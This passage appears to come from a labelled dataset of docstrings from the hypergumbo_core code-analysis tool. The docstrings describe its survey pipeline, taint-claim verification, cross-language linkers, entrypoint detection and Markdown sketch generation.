linkers. Installed dependency source\n   (Mix ``deps/``, ``node_modules/``, virtualenv ``site-packages``,\n   package-manager ``vendor/``, ``Pods/``) is skipped unless ``--trace-deps``\n   (sketch/survey/slice) or the ``trace_deps`` config key opts back in. The\n   skip is disclosed on stderr and in\n   ``supply_chain_summary.installed_deps_skipped``; generated output\n   recognised by the tool that writes it (``target/`` beside ``Cargo.toml``,\n   ``site/`` beside ``mkdocs.yml``, ...) is always skipped and disclosed the\n   same way, in ``generated_output_skipped``. ``main`` installs the\n   per-command ``--trace-deps`` override (``set_trace_deps_override``) and\n   clears it on every exit path.\n1. **Analyzers** run independently across 100+ languages\n   (``run_all_analyzers``). Cross-file usage-context references are then\n   resolved (``resolve_deferred_symbol_refs``) and every id and path is made\n   repo-relative (``_relativize_ir_paths``).\n2. **Producer merge** (ADR-0057 §3, ``merge_producer_records``): when two\n   producers analyzed the same declarations (tree-sitter ``rust`` with the\n   SCIP ``rust_analyzer`` arm, or ``python`` with ``scip_python``), their\n   records fold into one symbol per declaration. A producer with no merge\n   declaration is refused, not passed through.\n3. **Framework enrichment** (ADR-3aaa): ``refine_frameworks`` checks\n   manifest-detected frameworks against import edges, ``enrich_symbols``\n   attaches YAML-pattern concepts (route, model, ...), and\n   ``materialize_route_symbols`` / ``expand_class_based_view_routes`` mint\n   route-marker symbols for the route linkers to connect.\n4. **Linkers** run after all analyzers complete, to recover edges the\n   per-file analyzers could not see (``run_all_linkers``). Per ADR-3bbb they\n   span four subcategories — Protocol, Bridge, Framework and Infrastructure —\n   and only Bridge is language-pair; plenty of registered linkers\n   (``argparse_dispatch``, ``django_orm_dispatch``, ...) recover edges\n   *within* one language. Afterwards synthetic identities are reconciled\n   (``dedup_logical_synthetic_identities`` and siblings), duplicate edges and\n   self-loops are dropped (``deduplicate_edges``), and structural\n   fingerprints are stamped (``stamp_symbol_fingerprints``).\n5. **Supply-chain classification** (``_classify_symbols``) sets each\n   symbol's tier; route-bearing tier-4 symbols are then promoted to tier 1.\n6. **Tier filtering** drops supply-chain tier 4 (derived) symbols unless\n   ``--max-tier`` says otherwise, then **noise filtering** drops non-code\n   node kinds (docs, config, CSS structure; ``is_noise_symbol``) and their\n   edges unless ``--include-docs``.\n7. **Boundary synthesis** (``create_boundary_nodes``) runs after both\n   filters, collapsing dangling external references into boundary symbols\n   and remapping the edges that pointed at them. Symbols are then ranked\n   (``rank_symbols``), which fixes the output node order.\n8. ``finalize()`` is the single pre-serialization reconcile point\n   (ADR-0043 §6): it runs once the node and edge set is final. Metrics,\n   entrypoints, ``request_ingress`` (every request handler, taken before the\n   entrypoint rank floor and cap; read by verify-claims' unseeded-ingress\n   disclosure) and ``supply_chain_summary`` are added to the map after it.\n9. **Side outputs**: budget-tier files (``--budgets``), per-handler forward\n   slices in ``<stem>.slices/`` next to the map (``_emit_handler_slices``,\n   which also indexes each slice in the map's ``features`` array),\n   and a ``sketch_precomputed`` block embedded in the map so a later\n   ``sketch`` can skip recomputing its inputs. ``--compact`` then replaces\n   the main output with its compact projection.\n10. **Stderr summaries**: validator violations, silent / skipped /\n    unaccounted passes, and falsified pass dependencies (``emit_*`` calls\n    just before the write).\n\nAfter a survey, ``cmd_run`` evicts stale cache entries\n(``_maybe_evict_cache``, never the entry just written) before reporting the\ncache footprint.\n\n``--backend {tree-sitter,rust-analyzer,scip-python}`` is a global flag.\n``main`` accepts it in any position relative to the subcommand, in both the\n``--backend X`` and ``--backend=X`` forms, strips it from argv\n(``_strip_backend_flag``, which rejects a missing or unknown value with exit\n2, since argparse never sees the stripped flag), and resolves it at parse\ntime (``_apply_backend_choice``). A\nbackend whose integration package or binary is missing exits with an error\nright there instead of silently falling back to tree-sitter; the resolved\nchoice reaches the analyzer registry's backend gate through its environment\nvariable.\n\n``main`` also normalises the rest of argv and is the exit-code chokepoint.\n``--debug`` is stripped and honoured in any position. A first token that is\nneither a subcommand nor path-like (no separator, no leading ``.``/``~``, not\non disk) exits 2 with a did-you-mean suggestion instead of falling through to\nsketch. The positional path and ``--path`` collapse into ``args.path``, and\ngiving both exits 2. After the command, ``_maybe_offer_repo_tier_examples``\nruns (ADR-0047). ``CatalogueError`` and ``SubstrateError`` exit 2 with the\nloader's message, ``BrokenPipeError`` exits 1 quietly, and any other\nexception prints \"internal error\" and exits 1 (re-raised under ``--debug``).\n\n``verify-claims`` is orchestrated here as well (``cmd_verify_claims`` and its\nhelpers). I/O overlays stack in ascending precedence: the user's\n``io_primitives.d/``, then user config (``config.toml``), then the project's\n``.hypergumbo.toml`` overlays, loaded only on opt-in (``--in-repo-catalogues``\nor a ``trust-catalogues`` grant), then the claims file's ``extra_catalogs``,\nthen ``--io-primitives``. ``--no-default-overlays`` drops the\ncommunity-provenance files (ADR-0061). Taint claims run per language over the\nDDG-backed or structural propagator. A taint-blindness check (a language with\nno catalogue, or a catalogued language that emitted no call edges) supplies\nthe reason the verdict layer uses to report a would-be ``confirmed`` as\n``inconclusive``. The exit code is 0 when everything is confirmed, 1 when any\nclaim is violated, 2 when any is inconclusive and none violated, and 3 when\nany is ``confirmed_with_caveats`` and none of the above.\n\n``dead-code-maybe`` is implemented here too (``cmd_dead_code_maybe`` and its\nhelpers ``production_callables``, ``_bfs_reachable`` and\n``_compute_cross_language_hits``): production callables minus a BFS over\n``_REACHABILITY_EDGE_TYPES`` edges plus two walk-only hops (class to\ninitializer for each constructed class, and container to the code anchored\non it, ``anchor_execution_edges``), from the ``--seeds`` set (plus ``view_func``\ndispatch handlers), after which three false-positive demoters drop symbols in\ngenerated files, methods reached by inheritance dispatch, and candidates\nwhose name appears in at least ``--cross-lang-threshold`` other-language\nfiles.\n\nWhy This Design\n---------------\n- Subcommand dispatch keeps each operation isolated and testable\n- Default sketch mode optimizes for the common \"quick overview\" use case\n- run_survey() is separate from cmd_run() for testability\n- Read commands (slice, search, explain, ...) work from a persisted survey:\n  they reload it via ``survey_io.load_substrate`` and, where they need IR\n  objects, rehydrate it with ``Symbol.from_dict`` / ``Edge.from_dict``\n  (``_edge_from_dict`` is a thin wrapper), and ``_get_or_run_analysis`` runs a\n  survey first on a cache miss. There are two exceptions to the rehydration.\n  ``io-boundaries`` and ``verify-claims`` rebuild edges through a six-field\n  facade (``_rehydrate_io_boundary_edges``) that keeps ``is_resolved`` and\n  ``dst_ref`` for the boundary classifier. ``dead-code-maybe`` builds its\n  entrypoint-detection Symbols by hand from nine\n  fields (keeping ``discovery_language``, which entrypoint ranking reads\n  through ``host_language``, and dropping the rest, ``supply_chain_tier``\n  and ``modifiers`` among them), and only its\n  edges go through ``Edge.from_dict``. ``sketch`` is the exception to the\n  reload: the CLI reads a survey only with ``--input``; otherwise\n  ``sketch.py`` finds the cached survey itself and runs a survey only on a\n  cache miss. The ``--minimal`` flag (``_add_minimal_argument``) on the\n  ``_get_or_run_analysis`` commands skips that auto-survey's side outputs\n  (budget tiers, handler slices, ``sketch_precomputed``); it has no effect\n  when a cached survey is reused."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/cli.py",
+   "text": "Verify security claims against I/O boundary map and taint flow.\n\nLoads claims from a YAML file, computes the I/O boundary map, runs\ntaint-flow analysis if needed, and checks each claim. Returns exit\ncode 1 if any claim is violated. Supports boundary constraints\n(ADR-0016) and taint-flow constraints (ADR-0017).\n\nBuilt-in trust zones: the ``AUTO_SINK_ZONE_MAP`` zones in ``taint.py``\n(``host_fs``, ``subprocess``, ``network``, ``host_env``, ``ipc``,\n``browser_storage``, ``database``, ``logging``, ...) plus ADR-0060's\n``code_execution`` and ``dom_injection``; a user sink catalogue may add\nits own (``relay`` is PlazaFlow's). Built-in taint labels: ``host_secret``,\n``host_description``, ``untrusted_input``, ``plaintext``, ``key_material``,\n``ciphertext``, ``derived_key``. The source and sink catalogs are derived\nautomatically from ``io_primitives/*.yaml`` (every write-side primitive is\na sink at ``trust_level=untrusted``; ``env_read``, ``host_info_read``,\n``net_recv``, ``ipc_recv``, ``db_read``, ``navigation_read``,\n``command_line_read`` are sources; a ``command_line_read`` flow -- argv,\nwhich the launcher chose -- is set aside and counted per verdict in\n``command_line_flows`` unless the claim's ``taint_flow`` sets\n``include_command_line: true``, WI-zidam). ``host_description``\nis NOT a weaker ``host_secret``: it is a different fact, and a claim naming\none does not match flows carrying the other (INV-tutar). YAML files under ``taint_sources/`` and\n``taint_sanitizers/`` contribute cryptographic labels and sanitizer\ntransforms that the auto-layer cannot express, and ``taint_sinks/``\nships the sinks that are not I/O boundaries (``code_execution``,\n``dom_injection``; ADR-0060).\n\nProject-local catalogs (WI-votan): the ``--taint-sources``,\n``--taint-sinks``, and ``--taint-sanitizers`` flags each accept a YAML\nfile or a directory of YAMLs and are repeatable; the claims YAML may\ncarry the same paths under a top-level ``extra_catalogs:`` key with\n``sources``/``sinks``/``sanitizers`` sub-lists (paths resolve relative\nto the claims-file directory).  User entries whose\n``(module, name, kind)`` triple matches an auto-derived or built-in\nsource/sink replace it; user sanitizers concatenate.  This is the\nsupported extension point for declaring project-specific trust zones,\ndeclaring a sink ``trust_level: trusted`` when it is safe in context (its\nflows are excluded and disclosed per verdict in ``trusted_sink_flows``,\nWI-lukoz), or adding\na domain-specific taint source label."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/pass_silence.py",
+   "text": "Write the one-line silence summary to stderr; silent when none is due.\n\nThis is the CONSUMER half of the axis, and it is the half that discharges\nthe observability complaint INV-nanon actually raised. Stamping the field\nmade the reason RECORDABLE; without a surface that reads it back, the\nsurvey would carry a value nobody is shown — and a disclosure nothing reads\nis not a disclosure."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/safety_zones.py",
+   "text": "Create a cache directory (typically under ``~/.cache/hypergumbo/``).\n\nSAFETY ZONE: ``user_cache``. INV-zudak: ``Path.mkdir`` is an\nfs-write primitive that needs to route through the wrapper just like\n``cache_write`` / ``cache_write_bytes`` do, so the verify-claims\npass can distinguish ``user_cache`` scaffolding from arbitrary\n``host_fs`` directory creation."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/linkers/_name_args.py",
+   "text": "Yield ``(sender, receiver, join)`` for every pair that names the same channel.\n\n``scope`` partitions sites that may never join (the message-queue family);\n``casefold`` compares names case-insensitively (event-sourcing's rule).\nA pair joins on VALUE when both values are known and equal, else on\nIDENTIFIER when the identifiers are equal and at least one value is\nunknown. A pair is yielded at most once."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/linkers/phoenix_ipc.py",
+   "text": "Framework linker: Phoenix Channels IPC for detecting Elixir IPC patterns.\n\nThis linker detects Phoenix Channel patterns in Elixir code and creates\n``event_publishes`` edges (tagged ``meta.channel_kind=\"ipc\"``) for\ncross-process communication. Only publish-direction edges are emitted; the\nbespoke ``message_send``/``message_receive`` types were folded onto\n``event_publishes`` per the audit-findings 0001 consolidation.\n\nDetected Patterns\n-----------------\nPhoenix Channels:\n- broadcast!(socket, \"event\", payload) — send site\n- broadcast(socket, \"event\", payload) — send site\n- Endpoint.broadcast!(\"topic\", \"event\", payload) — send site\n- push(socket, \"event\", payload) — send site\n- handle_in(\"event\", payload, socket) — receive site\n\nPhoenix LiveView:\n- handle_event(\"event\", params, socket) — receive site\n- push_event(socket, \"event\", payload) — send site\n\nHow It Works\n------------\n1. Find all non-test Elixir files (*.ex, *.exs) in the repository\n2. Scan each file for Phoenix patterns using regex\n3. Extract event names from send/receive patterns\n4. Mint a synthetic symbol for each send site, and for each receive site\n   whose event is sent somewhere, then emit ``event_publishes``\n   (channel_kind=ipc) from each sender to every receiver of the same event\n\nWhy This Design\n---------------\n- Regex-based detection is fast and doesn't require tree-sitter\n- Event-based matching enables cross-file IPC graph construction\n- Separate linker keeps language analyzers focused on their language"
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/spec_validator.py",
+   "text": "Stable-ID-format conformance: every Symbol.stable_id matches the\ncanonical ``sha256:<16hex>`` schema.\n\nSee ADR-0034 §\"ID-format validator\" + Phase 6 PR1 (INV-hunup\nclosure). ``None`` is treated as pass: some Symbols legitimately\nhave no stable_id (e.g., the message_dispatch sender/handler stand-\nins explicitly set it to ``None`` per their docstrings). The\n``axis_conformance`` validator owns required-field presence."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/sketch.py",
+   "text": "Distinct absolute source paths named by a behavior map's nodes.\n\nINV-jumim: the read-path scoping (and the ``cmd_sketch`` staleness check)\nneed the file universe a ``--input`` map describes. Each node's ``path`` is\nrelative to ``repo_root``; synthetic non-filesystem paths (``<external>``\nand friends) are skipped, and duplicates (multiple symbols per file) are\ncollapsed. Returns ``[]`` when no map is given or it names no real files."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/sketch.py",
+   "text": "A symbol counts as a test when its path matches a test heuristic OR\nframework-pattern enrichment tagged it with a ``test_*`` concept.\n\nINV-gifoh: this is the canonical methodology shared by sketch and the\n`test-coverage` subcommand. WI-dibuf: the path half is the NODE predicate\n(``paths.is_test_node``), so a ``#[test]`` function in ``src/`` is a test."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/dataflow.py",
+   "text": "Build a lookup from node_type to child-field-based access modes.\n\nAssignment rules with both write and read sides (e.g.,\n``{node_type: assignment, write: left, read: right}``) produce\npositional maps like ``{\"assignment\": {\"left\": \"write\", \"right\": \"read\"}}``.\n\nNon-positional rules (deletions, returns, borrows) produce\na single ``_default`` key: ``{\"delete_statement\": {\"_default\": \"delete\"}}``."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/io_boundary.py",
+   "text": "One community overlay that ships in the wheel and loads by default.\n\n``provenance`` and ``retrieved`` exist so the disclosure can be CHECKABLE\nrather than asserted. \"hypergumbo does not maintain these rows\" is a claim\na reader should be able to test, and a date they can judge staleness\nagainst — the upstream API a row describes may have changed since anyone\nlooked.\n\n``provenance`` is the file's ADR-0061 tier token, and a shipped default\nis community by construction: ``\"community\"`` is its one valid value\n(``yaml_catalogs.PROVENANCE_COMMUNITY``), enforced by\n:func:`validate_default_overlays`."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/entrypoints.py",
+   "text": "INV-tajap PR 3: detect TS/JS standalone-script entrypoints.\n\nA ``SCRIPT_MODULE`` entrypoint is a TS/JS file-kind Symbol that satisfies\nboth:\n\n1. **No inbound ``imports`` edges** — no other file imports this one,\n   so the file isn't a library module.\n2. **At least one outbound ``calls`` edge** — the file does work at\n   module load (the proxy for \"top-level executable code\", spec rule\n   from the INV-tajap tracker).\n\nUnlike SHELL_SCRIPT / HTML_ENTRY which derive from analyzer-stamped\n``meta.concepts``, this rule needs the full edge set (inbound-imports\ncan only be answered after every analyzer + linker has run), so the\ndetection lives in ``detect_entrypoints`` itself instead of in\n``_detect_from_concepts``.\n\nConfidence 0.80 (one tier below shell_script / html_entry / main_guard\nat 0.85, because the rule is a structural inference rather than a\ndirect concept match)."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/entrypoints.py",
+   "text": "Detect entrypoints from semantic concept metadata.\n\nADR-3aaa introduces semantic entry detection: the FRAMEWORK_PATTERNS phase\nenriches symbols with concept metadata (meta.concepts) based on YAML pattern\nmatching. This function checks for entrypoint-worthy concepts and maps them\nto EntrypointKind values.\n\nBenefits:\n- YAML-driven: All detection is data-driven, not hardcoded\n- Eliminates false positives (e.g., React Router files won't have route concepts)\n- Framework-aware detection (concepts include framework info)\n\nDetected concepts (framework patterns, confidence=0.95):\n- \"route\" -> HTTP_ROUTE (HTTP endpoint handler)\n- \"route_handler\" -> HTTP_ROUTE (a handler the framework reaches through a\n  base class or a verb-named method: flask-restful, falcon, nex,\n  http.server, servlets; WI-losij. A symbol also carrying \"route\" is one\n  entrypoint, labelled by the route.)\n- \"controller\" -> CONTROLLER (request handler class/method)\n- \"task\" -> BACKGROUND_TASK (async/background job)\n- \"scheduled_task\" -> SCHEDULED_TASK (cron/periodic job)\n- \"websocket_handler\" -> WEBSOCKET_HANDLER (WebSocket event handler)\n- \"websocket_gateway\" -> WEBSOCKET_HANDLER (NestJS WebSocket gateway)\n- \"middleware\" -> MIDDLEWARE_HANDLER (HTTP middleware handler)\n- \"event_handler\" -> EVENT_HANDLER (event/message handler)\n- \"error_handler\" -> ERROR_HANDLER (HTTP / middleware exception handler)\n- \"form\" -> FORM (framework-reflected form class)\n- \"serializer\" -> SERIALIZER (framework-reflected serializer/DTO class)\n- \"command\" -> CLI_COMMAND (CLI command handler)\n- \"liveview\" -> CONTROLLER (Phoenix LiveView - real-time UI)\n- \"graphql_resolver\" -> GRAPHQL_SERVER (GraphQL resolver)\n- \"graphql_schema\" -> GRAPHQL_SERVER (GraphQL schema definition)\n- \"lifecycle_hook\" -> ANDROID_ACTIVITY/ANDROID_APPLICATION/CONTROLLER (Android lifecycle)\n- \"go_http_handler\" -> GO_HANDLER (Go http.Handler ServeHTTP; confidence=0.90)\n\nDetected concepts (generic entrypoint, confidence=0.90):\n- \"entrypoint\" -> ELECTRON_MAIN (electron) / MAIN_FUNCTION (others)\n- \"app_bootstrap\" -> SPA_BOOTSTRAP (createRoot, ReactDOM.render, hydrateRoot)\n\nDetected concepts (language conventions, confidence=0.80):\n- \"main_function\" -> MAIN_FUNCTION (function target: Go, Java, Python, C, etc.)\n- \"main_guard\" -> MAIN_GUARD (file target: Python `if __name__ == \"__main__\"`\n  with no separate main(); WI-tuvun — kind disambiguates target from\n  MAIN_FUNCTION)\n- \"test_function\" -> TEST_FUNCTION (pytest, JUnit, Go testing, etc.)\n- \"benchmark_function\" -> TEST_FUNCTION (Go Benchmark*, Rust #[bench])\n- \"example_function\" -> TEST_FUNCTION (Go Example*)\n\nArgs:\n    symbols: All symbols with potential concept metadata.\n\nReturns:\n    List of entrypoints detected via semantic concepts."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/run_status.py",
+   "text": "Name the pass the current thread runs, for the heartbeat's worker lines.\n\nOne dict store and one pop per pass, on the thread that runs it; the\nheartbeat thread only reads. CPython makes single dict operations\natomic, so no lock is needed."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/overload_arity.py",
+   "text": "The table-formula stable_id of a table-kind declaration nested in\n``scope`` (INV-fabih; see the module docstring).\n\n``make_declaration_stable_id(kind, lang, path, \"scope[0]/.../name\")``: the\nbackstop's own value for a top-level declaration (empty ``scope``), the\nscope chain in the name slot for a nested one. ``path`` must be\nrepo-relative. Raises ``ValueError`` for a kind the backstop has no\n``{kind}:{language}:{path}:{name}`` table formula for."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/framework_patterns.py",
+   "text": "Extract parent class name from a method symbol.\n\nParses the qualified name (e.g., \"UserController.findOne\" -> \"UserController\").\n\nArgs:\n    symbol: A method symbol\n\nReturns:\n    Parent class name, or None if not a method or can't be determined."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/sketch_embeddings.py",
+   "text": "Decode pre-computed probe embeddings from base64 float16.\n\nArgs:\n    b64_data: Base64-encoded float16 array.\n    num_probes: Number of probes (for reshape).\n\nReturns:\n    Normalized float32 embeddings array of shape (num_probes, 768)."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/supply_chain.py",
+   "text": "``(label, root)`` of the EXTERNAL_DEP_* pattern a repo-relative path\nmatches, ``root`` being the directory the pattern ends at (every pattern\nends in ``/``): ``a/vendor/x/y.c`` gives ``(\"vendor/\", \"a/vendor\")``."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/function_summaries/__init__.py",
+   "text": "``(document, parsed summaries)`` for one file, or a refusal naming it.\n\nParsed here, per file, rather than after ranking: a broken entry in a\ncommunity file ``include_community=False`` will drop is still a broken\nfile, and a refusal that depends on which flag was passed would be a\nrefusal a reader cannot reproduce."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/repo_tier_offer.py",
+   "text": "``True`` accepted, ``False`` declined, ``None`` never answered.\n\nThe three-way return is the point: ADR-0045 ruling 8's rule is that the\nnudge goes quiet for any path with a recorded decision, which means a\nDECLINE has to be distinguishable from an unanswered offer, not folded into\na falsy \"not accepted\"."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/linkers/jni.py",
+   "text": "Count C/C++/Rust functions with JNI naming convention (Java_...).\n\nJNI implementations can be written in C, C++, or Rust files. Android NDK\nprojects commonly use C++; Rust projects use #[no_mangle] extern \"C\"."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/analyze/cyclomatic.py",
+   "text": "Head-symbol cyclomatic walker for homoiconic languages.\n\nBase complexity 1; +1 per named node that is either a dedicated control\nnode type or a form node whose head symbol is a control form. Iterative\n(like the base walker) to avoid ``RecursionError`` on deep nesting."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/datamodels.py",
+   "text": "Detect data models from semantic concept metadata.\n\nYAML framework patterns emit \"model\", \"schema\", or \"entity\" concepts\nfor classes that match known data model patterns.\n\nThe label names the construct only (\"model\"); the framework goes in\n``DataModel.framework``, and the sketch renders ``{framework} {label}``.\nA label carrying the framework too printed it twice (WI-kibat).\n\nArgs:\n    symbols: All symbols with potential concept metadata.\n\nReturns:\n    List of data models detected via semantic concepts."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/linkers/http.py",
+   "text": "Protocol linker: HTTP client-server for detecting cross-language API calls.\n\nThis linker detects HTTP client calls (fetch, axios, AngularJS $http, jQuery $.ajax,\nOpenAPI clients, requests, httpx, Go net/http, RestClient, HTTParty, Faraday,\nNet::HTTP, RestTemplate, Retrofit, and Elm ``Http`` / ``Utils.Api`` calls) and links\nthem to server route handlers detected by language analyzers.\n\nTwo URL shapes get special handling beyond the literal case. JS/TS template\nliterals are folded to a comparable path before matching, so\n``fetch(`/api/users/${id}`)`` lines up with a server route carrying a path\nparameter. A template literal that stops at an unresolved slot, or is not\nanchored at ``/``, keeps its literal prefix as url_type=\"variable\"; if that\nprefix has 2 or more path segments it falls back to prefix matching against\nknown routes. A bare-identifier URL (``fetch(API_URL)``) goes through the\nshared ``_name_args`` resolver (WI-luhod): bound to a same-file module-scope\nstring constant, it becomes that URL (url_type=\"constant\") and is matched like\na literal; otherwise it is url_type=\"unresolved\", recorded as a client symbol\nwith no ``url_path``, and never matched -- its text is not a path.\n\nDetected Client Patterns\n------------------------\nJavaScript/TypeScript:\n- fetch(\"/api/users\") - Fetch API with literal URL\n- fetch(API_URL) - Fetch API with variable URL\n- fetch(\"/api/users\", { method: \"POST\" }) - with options\n- axios.get(\"/api/users\") - Axios library with literal URL\n- axios.get(config.apiUrl) - Axios with variable URL\n- __request(OpenAPI, { method: 'GET', url: '/api/users' }) - OpenAPI generated clients\n- $http.get(\"/api/users\") - AngularJS $http service\n- $http({method: 'GET', url: '/api/users'}) - AngularJS config object\n- $.get(\"/api/users\") - jQuery shorthand\n- $.post(\"/api/users\", data) - jQuery shorthand\n- $.ajax({url: '/api/users', type: 'GET'}) - jQuery $.ajax\n\nPython:\n- requests.get(\"/api/users\") - requests library with literal URL\n- requests.get(API_URL) - requests library with variable URL\n- httpx.get(\"/api/users\") - httpx library\n\nGo:\n- http.Get(\"/api/users\") - net/http standard library\n- http.Post(\"/api/users\", contentType, body) - net/http POST\n- http.Head(\"/api/users\") - net/http HEAD\n- http.NewRequest(\"DELETE\", \"/api/users/1\", nil) - explicit method\n- http.NewRequestWithContext(ctx, \"PATCH\", \"/api/users/1\", body) - with context\n\nRuby:\n- RestClient.get(\"/api/users\") - rest-client gem\n- HTTParty.get(\"/api/users\") - httparty gem\n- Faraday.get(\"/api/users\") - faraday gem\n- Net::HTTP.get(URI(\"/api/users\")) - stdlib net/http\n- Net::HTTP.post_form(URI(\"/api/users\"), data) - stdlib net/http POST\n- Net::HTTP.get_response(URI(\"/api/users\")) - stdlib net/http\n\nJava:\n- restTemplate.getForObject(\"/api/users\", ...) - Spring RestTemplate\n- restTemplate.postForEntity(\"/api/users\", ...) - Spring RestTemplate\n- restTemplate.exchange(\"/api/users\", HttpMethod.GET, ...) - Spring RestTemplate\n  (``put`` and ``delete`` are deliberately NOT matched as bare RestTemplate\n  methods — they collide with ``HashMap.put`` / ``List.delete``; use\n  ``exchange()`` for RestTemplate PUT/DELETE)\n- @GET(\"/api/users\") - Retrofit annotation\n- @POST(\"/api/items\") - Retrofit annotation\n\nElm (``_scan_elm_file``):\n- Utils.Api.get (apiUrl ++ \"/path\") - wrapper module; the base-URL variable\n  is dropped as the host and the literal path is matched\n- Http.get { url = \"/path\", ... } - elm/http method-named record forms\n- Http.request { method = \"POST\", url = \"/path\", ... } - explicit-method\n  record, with the method and url fields in either order\n- let url = String.join \"/\" [ apiUrl, \"silence\", uuid ] in\n  Utils.Api.get url ... - let-bound fold (``_find_elm_let_bound_url_calls``);\n  identifier items become ``{name}`` placeholders\n\nIdentifier URL Detection\n------------------------\n- const API_URL = '/api/users'; fetch(API_URL) -> url '/api/users',\n  url_type=\"constant\", matched and scored as a literal (0.9; 0.8\n  cross-language). Python, JS/TS, Java ``static final String`` and Go\n  ``const`` resolve; Ruby has no resolver rules, so its identifiers stay\n  unresolved.\n- fetch(API_URL) with API_URL imported, a parameter or dotted\n  (``config.apiUrl``) -> url_type=\"unresolved\": a client symbol, no route edge.\n  Before WI-luhod the identifier TEXT was route-matched.\n- A template literal folded to a prefix -> url_type=\"variable\", 0.65.\n\nServer Route Matching\n---------------------\nRoutes are matched by:\n1. HTTP method (GET, POST, PUT, DELETE, etc.)\n2. URL path pattern (exact match or parameterized)\n\nParameterized routes are supported:\n- /users/:id (Express/Rails style)\n- /users/{id} (FastAPI/Retrofit style)\n- /users/<id> (Flask style)\n\nHow It Works\n------------\n1. Collect route symbols from language analyzers, identified by\n   ``meta['framework_role']=='route'`` or ``concept: route`` — not by\n   ``kind``, which is ``function`` after the ADR-0027 fold\n2. Scan source files for HTTP client calls\n3. Extract URL and method from each call (literal or variable)\n4. Match to route symbols by method + path pattern\n5. Create canonical 'calls' edges with meta['protocol']='http' linking\n   client to server (post WI-vumum-juvil; pre-fold name was http_calls)\n\nWhy This Design\n---------------\n- Cross-language linking enables full-stack code understanding\n- Regex-based client detection is fast and portable\n- Route matching handles common parameterization patterns\n- Symbols for client calls enable slice traversal from either end\n- Identifier URLs are resolved by the same resolver the message-queue, IPC,\n  event-sourcing and websocket linkers use, so a constant means the same\n  thing in all five"
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/sketch.py",
+   "text": "Token-budgeted Markdown sketch generation.\n\nThis module generates human/LLM-readable Markdown summaries of\nrepositories, optimized for pasting into LLM chat interfaces. Output\nis token-budgeted to fill the available context.\n\nHow It Works\n------------\n``generate_sketch`` emits up to 13 sections in priority order. The\nbase sections (1-6) are built unconditionally and joined first; if\nthey alone reach the budget (and no ``require_sections`` is set),\nthe truncated base is returned. Sections 7-9 and 11-13 are each\ngated on data availability and remaining budget (``_section_ok``).\nKey Symbols is not budget-gated: its selection budget never drops\nbelow ``MIN_KEY_SYMBOLS`` (5). A final ``truncate_to_tokens`` pass\nthen trims the whole sketch. Section budget allocation follows\nADR-0005 (Entry Points ~33% of remaining; Data Models ~20%; Source\nFiles Content ~75% of what remains after the structural sections;\netc.).\n\nSections in emission order:\n1.  Header — repo name, plus the README-derived elevator pitch when\n    one is available (always)\n2.  Overview — language breakdown and LOC estimate, plus the\n    installed-dependency-source disclosure line when deps were skipped,\n    the generated-output disclosure line when generated output was pruned,\n    and the vendored-code disclosure line (``format_vendored_disclosure``)\n    when vendored code was analysed but left out of the language line\n3.  Structure — tree of paths to important files across up to 10 root\n    dirs (top-level listing when there are none), with a fixed-width LOC\n    column per line (``_TreeLoc``; all kept files, vendored included; the\n    root line's column is left blank) and, when a map-scoped index bounds\n    the tree, a closing note (``_structure_scope_note``) that files with no\n    detected symbol are left out of the counts and LOC\n4.  Frameworks — the profile's detected frameworks plus its dev/test-only\n    frameworks (annotated ``(dev)``), in one alphabetical list\n5.  Tests — test framework + estimated coverage breakdown\n6.  Configuration — config-file callouts (``CONFIG_FILES_BY_LANG``),\n    extracted per ``config_extraction_mode``: heuristic (known-field\n    patterns), embedding (semantic line selection, plus embedding\n    discovery of config files outside ``CONFIG_FILES_BY_LANG`` via\n    ``_discover_config_files_embedding``), or hybrid (heuristic, then\n    embedding for the leftover budget). The ``sketch`` CLI defaults to\n    ``--config-extraction hybrid``; embedding modes fall back to\n    heuristic when sentence-transformers is unavailable.\n    Heuristic mode extracts no environment variables or dotenv keys;\n    embedding/hybrid (the CLI default) can surface ENV /\n    ``environment:`` lines from Dockerfile and docker-compose files.\n7.  Entry Points — CLI commands, HTTP routes, IPC handlers,\n    cron / scheduler entries, grouped by kind; one entry budget is\n    shared across the groups (``_share_entry_budget``) so a repo with\n    hundreds of routes and exports cannot flood the sketch\n8.  Data Models — dataclasses, ORM entities, schema definitions,\n    with the four-strategy detection from ``datamodels.py``\n9.  Source Files — file paths (with module docstring when known),\n    ordered by ``rank_files`` density score when analysis ran, then\n    \"... and N more files\"\n10. Key Symbols — top symbols by dampened centrality\n11. Additional Files — always emitted when the budget allows;\n    ``--with-source`` shrinks its budget to 5% rather than gating it.\n    